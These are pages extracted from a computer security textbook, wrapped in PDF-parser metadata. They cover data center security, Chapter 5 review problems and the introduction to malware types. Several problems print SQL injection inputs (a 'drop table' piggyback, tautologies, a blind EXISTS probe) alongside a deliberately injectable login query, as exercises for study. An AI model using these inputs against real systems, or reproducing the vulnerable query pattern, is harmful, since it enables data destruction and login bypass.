       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 197, 'page_label': '196'}, page_content='196  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nmounted in the rack and referred to as top-of-rack (ToR) switches. The term ToR has \\nbecome synonymous with server access switch, even if it is not located “top of rack.” \\nVery large data centers, such as cloud providers, require switches operating at 100 \\nGbps to support the interconnection of server racks and to provide adequate capac-\\nity for connecting off-site through network interface controllers (NICs) on routers \\nor firewalls.\\nKey elements not shown in Figure 5.11 are cabling and cross connects, which \\nwe can list as follows:\\n• Cross connect:  A facility enabling the termination of cables, as well as their \\ninterconnection with other cabling or equipment.\\n• Horizontal cabling: Any cabling that is used to connect a floor’s wiring closet \\nto wall plates in the work areas to provide local area network (LAN) drops \\nfor connecting servers and other digital equipment to the network. The term \\nhorizontal is used because such cabling is typically run along the ceiling or \\nfloor.\\n• Backbone cabling: Run between data center rooms or enclosures and the main \\ncross-connect point of a building.\\nData Center Security Considerations\\nAll of the security threats and countermeasures discussed in this text are relevant \\nin\\xa0the context of large data centers, and indeed it is in this context that the risks \\nare\\xa0most acute. Consider that the data center houses massive amounts of data that \\nare:\\n• located in a confined physical space.\\n• interconnected with direct-connect cabling.\\n• accessible through external network connections, so once past the  boundary, a \\nthreat is posed to the entire complex.\\n• typically representative of the greatest single asset of the enterprise.\\nThus, data center security is a top priority for any enterprise with a large data \\ncenter. Some of the important threats to consider include the following:\\n• Denial of service\\n• Advanced persistent threats from targeted attacks\\n• Privacy breaches\\n• Application exploits such as SQL injection\\n• Malware\\n• Physical security threats\\nFigure 5.12 highlights important aspects of data center security, represented \\nas a four-layer model. Site security refers primarily to the physical security of the \\nentire site including the building that houses the data center, as well as the use of \\nredundant utilities. Physical security of the data center itself includes barriers to \\nentry, such as a mantrap (a double-door single-person access control space) coupled \\nM05_STAL0611_04_GE_C05.indd   196 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 198, 'page_label': '197'}, page_content='5.8 / DATA CEnTER SECuRiTy  197\\nwith authentication techniques for gaining physical access. Physical security can also \\ninclude security personnel, surveillance systems, and other measures which will be \\ndiscussed in Chapter\\xa016. Network security is extremely important in a facility in \\nwhich such a large collection of assets are concentrated in a single place and acces -\\nsible by external network connections. Typically, a large data center will employ all \\nof the network security techniques discussed in this text. Finally, security of the data \\nitself, as opposed to the systems they reside on, involves techniques discussed in the \\nremainder of this chapter.\\nTIA-492\\nThe Telecommunications Industry Association (TIA) standard TIA-492 ( Telecom-\\nmunications Infrastructure Standard for Data Centers) specifies the minimum require-\\nments for telecommunications infrastructure of data centers. Topics covered include \\nthe following:\\n• Network architecture\\n• Electrical design\\n• File storage, backup, and archiving\\n• System redundancy\\n• Network access control and security\\n• Database management\\n• Web hosting\\n• Application hosting\\n• Content distribution\\n• Environmental control\\n• Protection against physical hazards (fire, flood, and windstorm)\\n• Power management\\nFigure 5.12 Data Center Security Model\\nSite\\nSecurity\\nSetbacks, Redundant utilities\\nLandscaping, Buﬀer zones, Crash\\nbarriers, Entry points, etc.\\nPhysical\\nSecurity\\nSurveillance, Mantraps, Two/three\\nfactor authentication, Security\\nzones, ISO 27001/27002, etc.\\nNetwork\\nSecurity\\nFirewalls, Anti-virus, Intrusion\\ndetection/prevention,\\nauthentication, etc.\\nEncryption, Password policy, secure\\nIDs, Data Protection (ISO 27002),\\nData masking, Data retention, etc.\\nData\\nSecurity\\nM05_STAL0611_04_GE_C05.indd   197 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 199, 'page_label': '198'}, page_content='198  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nThe standard specifies function areas, which helps to define equipment place-\\nment based on the standard hierarchical design for regular commercial spaces. This \\narchitecture anticipates growth and helps create an environment where applications \\nand servers can be added and upgraded with minimal downtime. This standardized \\napproach supports high availability and a uniform environment for implementing \\nsecurity measures. TIA-942 specifies that a data center should include the following \\nfunctional areas (see Figure 5.13):\\n• Computer room: Portion of the data center that houses date processing equipment.\\n• Entrance room: One or more entrance rooms house external network access \\nprovider equipment, plus provide the interface between the computer room \\nequipment and the enterprise cabling systems. Physical separation of the \\nentrance room from the computer room provides better security.\\n• Main distribution area:  A centrally located area that houses the main cross-\\nconnect as well as core routers and switches for LAN and SAN (storage area \\nnetwork) infrastructures.\\n• Horizontal distribution area (HDA): Serves as the distribution point for hori-\\nzontal cabling and houses cross-connects and active equipment for distributing \\ncable to the equipment distribution area.\\nFigure 5.13 TIA-942 Compliant Data Center Showing Key Functional Areas\\nCarriersCarriers\\nComputer\\nRoom\\nEntrance Room\\n(Carrier equipment\\n& demarcation)\\nHoriz Dist Area\\n(LAN/SAN/KVM)\\nHoriz Dist Area\\n(LAN/SAN/KVM)\\nEquip Dist Area\\n(Rack/Cabinet)\\nZone Dist Area\\nEquip Dist Area\\n(Rack/Cabinet)\\nHoriz Dist Area\\n(LAN/SAN/KVM)\\nEquip Dist Area\\n(Rack/Cabinet)\\nBackbone cabling Horizontal cabling\\nOffices,\\nOperations Center\\nSupport Rooms\\nTelecom Room\\ncenter, LAN switches)\\n(Office and operations\\nMain Dist Area\\n(routers, backbone\\nLAN/SAN switches\\nPBX, M13 Muxes)\\nM05_STAL0611_04_GE_C05.indd   198 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 200, 'page_label': '199'}, page_content='5.8 / DATA CEnTER SECuRiTy  199\\n• Equipment distribution area (EDA): The location of equipment cabinets and \\nracks, with horizontal cables terminating with patch panels.\\n• Zone distribution area (ZDA): An optional interconnection point in the hori-\\nzontal cabling between the HDA and EDA. The ZDA can act as a consolidation \\npoint for reconfiguration flexibility or for housing freestanding equipment such \\nas mainframes.\\nAn important part of TIA-942, especially relevant for computer security, is the \\nconcept of tiered reliability. The standard defines four tiers, as shown in Table 5.4. \\nFor each of the four tiers, TIA-942 describes detailed architectural, security, electrical, \\nmechanical, and telecommunications recommendations such that the higher the tier \\nis, the higher will be the availability.\\nTier System Design Availability/Annual Downtime\\n1 •  Susceptible to disruptions from both planned and unplanned \\nactivity\\n• Single path for power and cooling distribution, no redundant \\ncomponents\\n• May or may not have raised floor, UPS, or generator\\n• Takes 3 months to implement\\n• Must be shut down completely to perform preventive \\nmaintenance\\n99.671%/28.8 hours\\n2 •  Less susceptible to disruptions from both planned and \\nunplanned activity\\n• Single path for power and cooling distribution, includes \\nredundant components\\n• Includes raised floor, UPS, and generator\\n• Takes 3 to 6 months to implement\\n• Maintenance of power path and other parts of the \\n infrastructure require a processing shutdown\\n99.741%/22.0 hours\\n3 •  Enables planned activity without disrupting computer \\nhardware operation but unplanned events will still cause \\ndisruption\\n• Multiple power and cooling distribution paths but with only \\none path active, includes redundant components\\n• Takes 15 to 20 months to implement\\n• Includes raised floor and sufficient capacity and distribution \\nto carry load on one path while performing maintenance on \\nthe other\\n99.982%/1.6 hours\\n4 •  Planned activity does not disrupt critical load and data center \\ncan sustain at least one worst-case unplanned event with no \\ncritical load impact\\n• Multiple active power and cooling distribution paths, includes \\nredundant components\\n• Takes 15 to 20 months to implement\\n99.995%/0.4 hours\\nTable 5.4 Data Center Tiers Defined in TIA-942\\nM05_STAL0611_04_GE_C05.indd   199 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 201, 'page_label': '200'}, page_content='200  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\n 5.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nattribute\\nblind SQL injection\\ncascading authorizations\\ncompromise\\ndata center\\ndata swapping\\ndatabase\\ndatabase access control\\ndatabase encryption\\ndatabase management system \\n(DBMS)\\ndefensive coding\\ndetection\\nend-of-line comment\\nforeign key\\ninband attack\\ninference\\ninference channel\\ninferential attack\\nout-of-band attack\\nparameterized query insertion\\npartitioning\\npiggybacked queries\\nprimary key\\nquery language\\nquery set\\nrelation\\nrelational database\\nrelational database manage-\\nment system (RDBMS)\\nrun-time prevention\\nStructured Query Language \\n(SQL)\\nSQL injection (SQLi) attack\\ntautology\\ntuple\\nview\\nReview Questions\\n 5.1 Define the terms database, database management system, and query language.\\n 5.2 What is a relational database and what are its principal ingredients?\\n 5.3 What is an SQL injection attack?\\n 5.4 What are the implications of an SQL injection attack?\\n 5.5 List the categories for grouping different types of SQLi attacks.\\n 5.6 Why is RBAC considered fit for database access control?\\n 5.7 State the different levels at which encryption can be applied to a database.\\n 5.8 List and briefly define four data center availability tiers.\\nProblems\\n 5.1 Consider a simplified database for an organization that includes information of sev -\\neral departments (identity, name, manager, number of employees) and of managers \\nand employees of the respective departments. Suggest a relational database for effi -\\nciently managing this information.\\n 5.2 The following table pr ovides information on students of a computer programming \\nclub.\\nStudent-ID Name Skill Level Age\\n99 Jimmy Beginner 20\\n36 David Experienced 22\\n82 Oliver Medium 21\\n23 Alice Experienced 21\\nM05_STAL0611_04_GE_C05.indd   200 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 202, 'page_label': '201'}, page_content=\"5.9 / KEy TERMS, REViEW QuESTiOnS, AnD PRObLEMS  201\\n  The primary key is Student-ID. Explain whether or not each of the following rows can \\nbe added to the table.\\nStudent-ID Name Skill Level Age\\n91 Tom Experienced 22\\n36 Dave Experienced 21\\nBob Beginner 20\\n 5.3 The following table shows a list of cars and their owners that is used by a car service \\nstation.\\nC_Name Model Company DOP Owner O_Phone O_E-mail\\nCamaro 2LS Chevrolet 9/9/06 David 2132133 dd@abc.com\\nFalcon XR6 Ford 2/21/07 Dave 1245513 dv@abc.com\\nCruze LT Chevrolet 5/12/12 David 1452321 dd@abc.com\\nCamaro 2LT Chevrolet 7/6/10 Alice 3253254 al@ab.com\\nRoadster Roadster Tesla 1/20/13 Dave 2353253 dv@abc.com\\nFocus S Ford 4/10/12 Oliver 3251666 ol@abc.com\\nModel X Model X Tesla 3/9/14 Bob 7567443 bb@abc.com\\na. Describe the problems that are likely to occur when using this table.\\nb. Break the table into two tables in a way that fixes the problems.\\n 5.4 We wish to cr eate an employee table containing the employee’s ID number, first \\nname, last name, and department. Write an SQL statement to accomplish this.\\n 5.5 Consider an SQL statement:\\nSELECT id, forename, surname FROM authors WHERE forename =  ‘david’ AND \\nid =  939\\na. What is this statement trying to search from the database?\\nb. Assume that the firstname and id fields are being gather ed from user-supplied \\ninput, and suppose the user responds with:\\nFirstname: david’; drop table employees - -\\nid: 939:\\nWhat will be the effect?\\nc. Now suppose the user responds with:\\nfirstname: ’ OR 9 =  9 - -\\nid: 939\\nWhat will be the effect?\\n 5.6 Figure 5.14 shows a fragment of code that implements the login functionality for a \\ndatabase application. The code dynamically builds an SQL query and submits it to a \\ndatabase.\\na. Suppose a user submits login, passwor d, and pin as Mike, Mike@256, and 4242. \\nWrite the SQL query that is generated.\\nb. If, instead of the previous inputs, the user submits for each of the login, password \\nand pin fields:\\n' or '' = '\\nWhat is the effect?\\nM05_STAL0611_04_GE_C05.indd   201 10/11/17   2:49 PM\"),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 203, 'page_label': '202'}, page_content='202  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\n1. String login, password, pin, query\\n2. login = getParameter(“login”);\\n3. password = getParameter(“pass”);\\n3. pin = getParameter(“pin”);\\n4. Connection conn.createConnection(“MyDataBase”);\\n5. query = “SELECT accounts FROM users WHERE login=’” +\\n6.      login + “‘AND pass = ’” + password +\\n7.      “‘AND pin=” + pin;\\n8. ResultSet result = conn.executeQuery(query);\\n9. if (result!=NULL)\\n10      displayAccounts(result);\\n11 else\\n12      displayAuthFailed();\\nFigure 5.14 Code for Generating an SQL Query\\n 5.7 The EXISTS operator is used to test for the existence of any record in a subquery. \\nSuppose you know that a user with the login Mike exists in the user table but you do \\nnot know their password. You enter the following in the login field:\\n’ OR EXISTS (SELECT * FROM users WHERE name =  ‘Mike’ AND password \\nLIKE ‘%t%’) –\\nWhat is the effect?\\n 5.8 Assume A, B, and C grant certain privileges on the employee table to X, who in turn \\ngrants them to Y, as shown in the following table, with the numerical entries indicating \\nthe time of granting:\\nUserID Table Grantor READ INSERT DELETE\\nX Employee A 15 15 —\\nX Employee B 20 — 20\\nY Employee X 25 25 25\\nX Employee C 30 — 30\\nAt time t = 35, B issues the command REVOKE ALL RIGHTS ON Employee \\nFROM X. Which access rights, if any, of Y must be revoked, using the conventions \\ndefined in Section 5.2?\\n 5.9 Figure 5.15 shows a sequence of grant operations for a specific access right on a table. \\nAssume at t = 70, B revokes the access right from C. Using the conventions defined \\nin Section 5.2, show the resulting diagram of access right dependencies.\\nFigure 5.15 Cascaded Privileges\\nA\\nB\\nC D E\\nt = 60\\nt = 50\\nt = 30\\nt = 40\\nt = 20\\nt = 10\\nM05_STAL0611_04_GE_C05.indd   202 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 204, 'page_label': '203'}, page_content='5.9 / KEy TERMS, REViEW QuESTiOnS, AnD PRObLEMS  203\\n 5.10 Figure 5.16 shows an alternative convention for handling revocations of the type illus-\\ntrated in Figure 5.6.\\nFigure 5.16 Bob Revokes Privilege from David, Second Version\\nAnn\\nBob\\nChris\\nDavid Frank\\nEllen Jim\\nt = 70\\nt = 60t = 40\\nt = 30\\nt = 50\\nt = 10\\nt = 20\\nAnn\\nBob\\nChris\\nDavid Frank\\nEllen Jim\\nt = 70\\nt = 60\\nt = 40\\nt = 60\\nt = 50\\nt = 10\\nt = 20\\na. Describe an algorithm for revocation that fits this figure.\\nb. Compare the relative advantages and disadvantages of this method to the original \\nmethod, illustrated in Figure 5.6.\\n 5.11 Consider the parts department of a plumbing contractor . The department maintains \\nan inventory database that includes parts information (part number, description, \\ncolor, size, number in stock, etc.) and information on vendors from whom parts are \\nobtained (name, address, pending purchase orders, closed purchase orders, etc.). In an \\nRBAC system, suppose roles are defined for accounts payable clerk, an installation \\nforeman, and a receiving clerk. For each role, indicate which items should be acces -\\nsible for read-only and read-write access.\\n 5.12 Imagine you are the database administrator for a military transportation system. You \\nhave a table named cargo in your database that contains information on the various \\ncargo holds available on each outbound airplane. Each row in the table represents a \\nsingle shipment and lists the contents of that shipment and the flight identification \\nnumber. Only one shipment per hold is allowed. The flight identification number may \\nbe cross-referenced with other tables to determine the origin, destination, flight time, \\nand similar data. The cargo table appears as follows:\\nFlight ID Cargo Hold Contents Classification\\n1254 A Boots Unclassified\\n1254 B Guns Unclassified\\n1254 C Atomic bomb Top Secret\\n1254 D Butter Unclassified\\nM05_STAL0611_04_GE_C05.indd   203 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 205, 'page_label': '204'}, page_content='204  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nSuppose two roles are defined: Role 1 has full access rights to the cargo table. Role 2 \\nhas full access rights only to rows of the table in which the Classification field has the \\nvalue Unclassified. Describe a scenario in which a user assigned to role 2 uses one or \\nmore queries to determine that there is a classified shipment on board the aircraft.\\n 5.13 Users hulkhogan and undertaker do not have the SELECT access right to the Inven-\\ntory table and the Item table. These tables were created by and are owned by user \\nbruno-s. Write the SQL commands that would enable bruno-s to grant SELECT \\naccess to these tables to hulkhogan and undertaker.\\n 5.14 In the example of Section 5.6 involving the addition of a start-date column to a set \\nof tables defining employee information, it was stated that a straightforward way to \\nremove the inference channel is to add the start-date column to the employees table. \\nSuggest another way.\\n 5.15 Consider a database table that includes a salary attribute. Suppose the three queries \\nsum, count, and max (in that order) are made on the salary attribute, all conditioned \\non the same predicate involving other attributes. That is, a specific subset of records \\nis selected and the three queries are performed on that subset. Suppose the first two \\nqueries are answered, and the third query is denied. Is any information leaked?\\nM05_STAL0611_04_GE_C05.indd   204 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 206, 'page_label': '205'}, page_content='205\\n6.1 Types of Malicious Software (Malware)\\nA Broad Classification of Malware\\nAttack Kits\\nAttack Sources\\n6.2 Advanced Persistent Threat\\n6.3 Propagation—Infected Content—Viruses\\nThe Nature of Viruses\\nMacro and Scripting Viruses\\nViruses Classification\\n6.4 Propagation—Vulnerability Exploit—Worms\\nTarget Discovery\\nWorm Propagation Model\\nThe Morris Worm\\nA Brief History of Worm Attacks\\nState of Worm Technology\\nMobile Code\\nMobile Phone Worms\\nClient-Side Vulnerabilities and Drive-by-Downloads\\nClickjacking\\n6.5 Propagation—Social Engineering—Spam E-Mail, Trojans\\nSpam (Unsolicited Bulk) E-Mail\\nTrojan Horses\\nMobile Phone Trojans\\n6.6 Payload—System Corruption\\nData Destruction\\nReal-World Damage\\nLogic Bomb\\n6.7 Payload—Attack Agent—Zombie, Bots\\nUses of Bots\\nRemote Control Facility\\n6.8 Payload—Information Theft—Keyloggers, Phishing, Spyware\\nCredential Theft, Keyloggers, and Spyware\\nPhishing and Identity Theft\\nReconnaissance, Espionage, and Data Exfiltration\\nMalicious Software\\nCHAPTER \\n \\nM06_STAL0611_04_GE_C06.indd   205 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 207, 'page_label': '206'}, page_content='206  CHAPTER 6 / MAliCiouS SofTwARE\\nMalicious software, or malware, arguably constitutes one of the most significant cat-\\negories of threats to computer systems. NIST SP 800-83 (Guide to Malware Incident \\nPrevention and Handling for Desktops and Laptops,  July 2013) defines malware as \\n“a program that is inserted into a system, usually covertly, with the intent of com -\\npromising the confidentiality, integrity, or availability of the victim’s data, applica -\\ntions, or operating system or otherwise annoying or disrupting the victim.” Hence, \\nwe are concerned with the threat malware poses to application programs, to utility \\nprograms such as editors and compilers, and to kernel-level programs. We are also \\nconcerned with its use on compromised or malicious websites and servers, or in espe-\\ncially crafted spam e-mails or other messages, which aim to trick users into revealing \\nsensitive personal information.\\nThis chapter examines the wide spectrum of malware threats and counter -\\nmeasures. We begin with a survey of various types of malware, and offer a broad \\n classification based first on the means malware uses to spr ead or propagate, then \\non the variety of actions or payloads used once the malware has reached a target. \\nPropagation mechanisms include those used by viruses, worms, and Trojans. Payloads \\ninclude system corruption, bots, phishing, spyware, and rootkits. The discussion con-\\ncludes with a review of countermeasure approaches.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Describe three broad mechanisms malware uses to propagate.\\n ◆ Understand the basic operation of viruses, worms, and Trojans.\\n ◆ Describe four broad categories of malware payloads.\\n ◆ Understand the different threats posed by bots, spyware, and rootkits.\\n ◆ Describe some malware countermeasure elements.\\n ◆ Describe three locations for malware detection mechanisms.\\n6.9 Payload—Stealthing—Backdoors, Rootkits\\nBackdoor\\nRootkit\\nKernel Mode Rootkits\\nVirtual Machine and Other External Rootkits\\n6.10 Countermeasures\\nMalware Countermeasure Approaches\\nHost-Based Scanners and Signature-Based Anti-Virus\\nPerimeter Scanning Approaches\\nDistributed Intelligence Gathering Approaches\\n6.11 Key Terms, Review Questions, and Problems\\nM06_STAL0611_04_GE_C06.indd   206 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 208, 'page_label': '207'}, page_content='6.1 / TYPES of MAliCiouS SofTwARE (MAlwARE)  207\\nName Description\\nAdvanced Persistent \\nThreat (APT)\\nCybercrime directed at business and political targets, using a wide variety of intru-\\nsion technologies and malware, applied persistently and effectively to specific \\n targets over an extended period, often attributed to state-sponsored organizations.\\nAdware Advertising that is integrated into software. It can result in pop-up ads or \\n redirection of a browser to a commercial site.\\nAttack kit Set of tools for generating new malware automatically using a variety of supplied \\npropagation and payload mechanisms.\\nAuto-rooter Malicious hacker tools used to break into new machines remotely.\\nBackdoor (trapdoor) Any mechanism that bypasses a normal security check; it may allow unauthorized \\naccess to functionality in a program, or onto a compromised system.\\nDownloaders Code that installs other items on a machine that is under attack. It is normally \\nincluded in the malware code first inserted on to a compromised system to then \\nimport a larger malware package.\\nDrive-by-download An attack using code on a compromised website that exploits a browser \\n vulnerability to attack a client system when the site is viewed.\\nExploits Code specific to a single vulnerability or set of vulnerabilities.\\nFlooders (DoS client) Used to generate a large volume of data to attack networked computer systems, \\nby carrying out some form of denial-of-service (DoS) attack.\\nKeyloggers Captures keystrokes on a compromised system.\\nLogic bomb Code inserted into malware by an intruder. A logic bomb lies dormant until a \\n predefined condition is met; the code then triggers some payload.\\nMacro virus A type of virus that uses macro or scripting code, typically embedded in a \\n document or document template, and triggered when the document is viewed or \\nedited, to run and  replicate itself into other such documents.\\nMobile code Software (e.g., script and macro) that can be shipped unchanged to a heteroge-\\nneous collection of platforms and execute with identical semantics.\\nRootkit Set of hacker tools used after attacker has broken into a computer system and \\ngained root-level access.\\nSpammer programs Used to send large volumes of unwanted e-mail.\\nSpyware Software that collects information from a computer and transmits it to another \\nsystem by monitoring keystrokes, screen data, and/or network traffic; or by scan-\\nning files on the system for sensitive information.\\nTrojan horse A computer program that appears to have a useful function, but also has a hidden \\nand potentially malicious function that evades security mechanisms, sometimes by \\nexploiting legitimate authorizations of a system entity that invokes it.\\nVirus Malware that, when executed, tries to replicate itself into other executable \\nmachine or script code; when it succeeds, the code is said to be infected. When the \\ninfected code is executed, the virus also executes.\\nTable 6.1 Terminology for Malicious Software (Malware)\\n 6.1 TYPES OF MALICIOUS SOFTWARE (MALWARE)\\nThe terminology in this area presents problems because of a lack of universal agree-\\nment on all of the terms and because some of the categories overlap. Table 6.1 is a \\nuseful guide to some of the terms in use.\\n(continued)\\nM06_STAL0611_04_GE_C06.indd   207 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 209, 'page_label': '208'}, page_content='208  CHAPTER 6 / MAliCiouS SofTwARE\\nA Broad Classification of Malware\\nA number of authors attempt to classify malware, as shown in the survey and proposal \\nof [HANS04]. Although a range of aspects can be used, one useful approach classifies \\nmalware into two broad categories, based first on how it spreads or propagates to reach \\nthe desired targets, then on the actions or payloads it performs once a target is reached.\\nPropagation mechanisms include infection of existing executable or interpreted \\ncontent by viruses that is subsequently spread to other systems; exploit of software \\nvulnerabilities either locally or over a network by worms or drive-by-downloads to \\nallow the malware to replicate; and social engineering attacks that convince users \\nto bypass security mechanisms to install Trojans, or to respond to phishing attacks.\\nEarlier approaches to malware classification distinguished between those that \\nneed a host program, being parasitic code such as viruses, and those that are inde -\\npendent, self-contained programs run on the system such as worms, Trojans, and \\nbots. Another distinction used was between malware that does not replicate, such \\nas Trojans and spam e-mail, and malware that does, including viruses and worms.\\nPayload actions performed by malware once it reaches a target system can \\ninclude corruption of system or data files; theft of service in order to make the system \\na zombie agent of attack as part of a botnet; theft of information from the system, \\nespecially of logins, passwords, or other personal details by keylogging or spyware \\nprograms; and stealthing where the malware hides its presence on the system from \\nattempts to detect and block it.\\nWhile early malware tended to use a single means of propagation to deliver a \\nsingle payload, as it evolved, we see a growth of blended malware that incorporates a \\nrange of both propagation mechanisms and payloads that increase its ability to spread, \\nhide, and perform a range of actions on targets. A blended attack uses multiple meth-\\nods of infection or propagation to maximize the speed of contagion and the severity \\nof the attack. Some malware even support an update mechanism that allows it to \\nchange the range of propagation and payload mechanisms utilized once it is deployed.\\nIn the following sections, we survey these various categories of malware, then \\nfollow with a discussion of appropriate countermeasures.\\nAttack Kits\\nInitially, the development and deployment of malware required considerable techni-\\ncal skill by software authors. This changed with the development of  virus-creation \\ntoolkits in the early 1990s, and later of more general attack kits in the 2000s. \\nThese greatly assisted in the development and deployment of malware [FOSS10]. \\nThese toolkits, often known as crimeware, now include a variety of propagation \\n mechanisms and payload modules that even novices can combine, select, and deploy. \\nName Description\\nWorm A computer program that can run independently and can propagate a complete \\nworking version of itself onto other hosts on a network, by exploiting  software \\nvulnerabilities in the target system, or using captured authorization credentials.\\nZombie, bot Program installed on an infected machine that is activated to launch attacks on \\nother machines.\\nTable 6.1 Terminology for Malicious Software (Malware) (Continued)\\nM06_STAL0611_04_GE_C06.indd   208 10/11/17   2:51 PM'),\n",
